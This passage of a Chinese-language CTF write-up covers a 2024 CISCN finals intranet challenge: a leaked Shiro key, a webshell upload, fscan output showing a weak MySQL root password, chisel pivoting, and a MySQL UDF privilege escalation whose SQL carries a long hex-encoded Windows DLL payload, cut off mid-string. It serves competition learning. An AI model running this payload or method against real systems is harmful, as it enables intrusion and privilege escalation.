/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/libjava.util.logging.FileHandler.limit <span class="token operator">=</span> <span class="token number">50000</span>java.vendor <span class="token operator">=</span> Private Buildjava.vm.info <span class="token operator">=</span> mixed modekeystore.type <span class="token operator">=</span> jksjava.specification.maintenance.version <span class="token operator">=</span> <span class="token number">5</span>handlers <span class="token operator">=</span> java.util.logging.ConsoleHandlerjava.ext.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/extsun.io.unicode.encoding <span class="token operator">=</span> UnicodeLittlepolicy.expandProperties <span class="token operator">=</span> <span class="token boolean">true</span>securerandom.strongAlgorithms <span class="token operator">=</span> NativePRNGBlocking:SUNkrb5.kdc.bad.policy <span class="token operator">=</span> tryLast<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>ProcessEnvironment-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>OSS-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>UserPassSearcher-------------org.apache.shiro.web.filter.authc.FormAuthenticationFilter:<span class="token punctuation">[</span>failureKeyAttribute <span class="token operator">=</span> shiroLoginFailure, loginUrl <span class="token operator">=</span> /login, successUrl <span class="token operator">=</span> /, usernameParam <span class="token operator">=</span> username, passwordParam <span class="token operator">=</span> password<span class="token punctuation">]</span>org.apache.catalina.startup.Tomcat:<span class="token punctuation">[</span>hostname <span class="token operator">=</span> localhost<span class="token punctuation">]</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥åœ¨é‡Œé¢æ‰¾åˆ°shiroå¯†é’¥</p><p><code>algMode = GCM, key = 0f+dthGML0M572/nBElv8g==, algName = AES</code></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721084057165.png" alt="image-20240721084057165"></p><p>ç„¶åä¸Šèšå‰‘é©¬å³å¯ï¼Œflagåœ¨æ ¹ç›®å½•ä¸‹</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721084318969.png" alt="image-20240721084318969"></p><p>æ¥ä¸‹æ¥ä»¥è¿™ä¸ªä¸ºè·³æ¿æœºï¼Œä¼ ä¸ªfscanæ‰«ä¸€ä¸‹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ./fscan <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.8.146/24<span class="token number">192.168</span>.8.146:22 <span class="token function">open</span><span class="token number">192.168</span>.8.38:139 <span class="token function">open</span><span class="token number">192.168</span>.8.16:139 <span class="token function">open</span><span class="token number">192.168</span>.8.26:139 <span class="token function">open</span><span class="token number">192.168</span>.8.9:139 <span class="token function">open</span><span class="token number">192.168</span>.8.12:139 <span class="token function">open</span><span class="token number">192.168</span>.8.26:135 <span class="token function">open</span><span class="token number">192.168</span>.8.38:135 <span class="token function">open</span><span class="token number">192.168</span>.8.16:135 <span class="token function">open</span><span class="token number">192.168</span>.8.12:135 <span class="token function">open</span><span class="token number">192.168</span>.8.9:135 <span class="token function">open</span><span class="token number">192.168</span>.8.9:1433 <span class="token function">open</span><span class="token number">192.168</span>.8.38:445 <span class="token function">open</span><span class="token number">192.168</span>.8.26:445 <span class="token function">open</span><span class="token number">192.168</span>.8.16:445 <span class="token function">open</span><span class="token number">192.168</span>.8.12:445 <span class="token function">open</span><span class="token number">192.168</span>.8.9:445 <span class="token function">open</span><span class="token number">192.168</span>.8.42:80 <span class="token function">open</span><span class="token number">192.168</span>.8.42:22 <span class="token function">open</span><span class="token number">192.168</span>.8.26:8080 <span class="token function">open</span><span class="token number">192.168</span>.8.16:8080 <span class="token function">open</span><span class="token number">192.168</span>.8.146:8080 <span class="token function">open</span><span class="token number">192.168</span>.8.9:8000 <span class="token function">open</span><span class="token number">192.168</span>.8.9:80 <span class="token function">open</span><span class="token number">192.168</span>.8.38:3306 <span class="token function">open</span><span class="token number">192.168</span>.8.12:88 <span class="token function">open</span><span class="token number">192.168</span>.8.42:8060 <span class="token function">open</span><span class="token number">192.168</span>.8.9:8172 <span class="token function">open</span><span class="token number">192.168</span>.8.42:9094 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.9     WORKGROUP<span class="token punctuation">\</span>WIN-IISSERER        <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.26    WORKGROUP<span class="token punctuation">\</span>WIN-PC3788          <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.12    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> DC:VERTEXSOFT<span class="token punctuation">\</span>RODC         <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.38    WORKGROUP<span class="token punctuation">\</span>WIN-OPS88           <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.16    WORKGROUP<span class="token punctuation">\</span>WIN-SERVER03        <span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42:8060  code:404 len:555    title:404 Not Found<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.12   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>RODC   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.12<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.38   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-OPS88   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.38<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.26   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-PC3788   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.26<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9:8000   code:200 len:4018   title:Modbus Monitor - VertexSoft Internal Attendance System<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.9   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-IISSERER   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.9<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.16   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-SERVER03   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.16<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.146:8080 code:302 len:0      title:None è·³è½¬url: http://192.168.8.146:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>6FF5708E4EEFFF8BDFC2934D53AC7C8F<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.146:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>6FF5708E4EEFFF8BDFC2934D53AC7C8F code:200 len:1383   title:Master ERP login Form<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42       code:302 len:99     title:None è·³è½¬url: http://192.168.8.42/users/sign_in<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.26:8080  code:200 len:147    title:ç¬¬ä¸€ä¸ª JSP ç¨‹åº<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9        code:200 len:43679  title:VertexSoft<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle https://192.168.8.9:8172  code:404 len:0      title:None<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.16:8080  code:403 len:594    title:None<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42/users/sign_in code:200 len:11166  title:ç™»å½• Â· GitLab<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://192.168.8.146:8080 poc-yaml-spring-actuator-heapdump-file <span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://192.168.8.146:8080 poc-yaml-springboot-env-unauth spring2<span class="token punctuation">[</span>+<span class="token punctuation">]</span> mysql <span class="token number">192.168</span>.8.38:3306:root <span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="WIN-OPS88"><a href="#WIN-OPS88" class="headerlink" title="WIN-OPS88"></a>WIN-OPS88</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.38   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-OPS88   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.38<span class="token punctuation">[</span>+<span class="token punctuation">]</span> mysql <span class="token number">192.168</span>.8.38:3306:root <span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åšchiselä»£ç†æŠŠWIN-OPS88çš„æ•°æ®åº“ç«¯å£è½¬å‘å‡ºæ¥ï¼ˆå…¶å®å¯ä»¥ç›´æ¥åšsocketsä»£ç†å‡ºæ‰€æœ‰çš„å†…ç½‘ipï¼Œå·¨é­”æ•™çš„ï¼‰</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095403405.png" alt="image-20240721095403405"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095424140.png" alt="image-20240721095424140"></p><p>æ—¢ç„¶æœ‰è´¦å¯†ï¼Œé‚£ä¹ˆç›´æ¥sqlè¿ä¸Šå»ï¼Œæ•°æ®åº“é‡Œæ²¡åˆ«çš„ä¸œè¥¿</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721225527342.png" alt="image-20240721225527342"></p><p>å°è¯•udfææƒï¼Œæ³¨æ„æ˜¯win64çš„payloadï¼ˆè¿™é‡Œæˆ‘çœ‹åˆ«äººç›´æ¥ç”¨mdutå·¥å…·ä¸€æŠŠæ¢­äº†ï¼Œè€Œæˆ‘çš„è¿˜åœ¨æŠ¥é”™ï¼‰</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">"%plugin%"</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07031F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB8A16F3C3488D042F83F9058A1076214883FDFC771B83E9048B104883C00483E9048917488D7F0473EF83C1048A10741048FFC0881783E9018A10488D7F0175F0F3C3FC415BEB0848FFC6881748FFC78A1601DB750A8B1E4883EEFC11DB8A1672E68D410141FFD311C001DB750A8B1E4883EEFC11DB8A1673EB83E8037217C1E0080FB6D209D048FFC683F0FF0F843A0000004863E88D410141FFD311C941FFD311C9751889C183C00241FFD311C901DB75088B1E4883EEFC11DB73ED4881FD00F3FFFF11C1E83AFFFFFFEB835E4889F7B900120000B2004889FBEB2C8A074883C7013C80720A3C8F7706807FFE0F74062CE83C0177233817751F8B072500FFFFFF0FC829F801D8AB4883E9048A074883C70148FFC975D9EB0548FFC975BE4883EC28488DBE007000008B0709C0744F8B5F04488D8C30B0A100004801F34883C708FF96ECA1000048958A0748FFC708C074D74889F94889FAFFC8F2AE4889E9FF96F4A100004809C074094889034883C308EBD64883C4285D5F5E5B31C0C34883C4284883C704488D5EFC31C08A0748FFC709C074233CEF77114801C3488B03480FC84801F0488903EBE0240FC1E010668B074883C702EBE1488BAEFCA10000488DBE00F0FFFFBB00100000504989E141B8040000004889DA4889F94883EC20FFD5488D871702000080207F8060287F4C8D4C24204D8B014889DA4889F9FFD54883C4285D5F5E5B488D4424806A004839C475F94883EC804C8B442418488B542410488B4C2408E91F79FFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005CB0000054010000E404000000000000586000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E0000000000000000000000002CB20000ECB1000000000000000000000000000039B200001CB20000000000000000000000000000000000000000000044B200000000000052B200000000000062B200000000000072B200000000000080B200000000000000000000000000008EB200000000000000000000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000667265650000000000000000A727A15A0000000074B30000010000001200000012000000C0B2000008B3000050B300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000C010000000130000E0120000A011000089B300009FB30000BCB30000D7B30000E3B30000F6B3000007B4000010B4000020B400002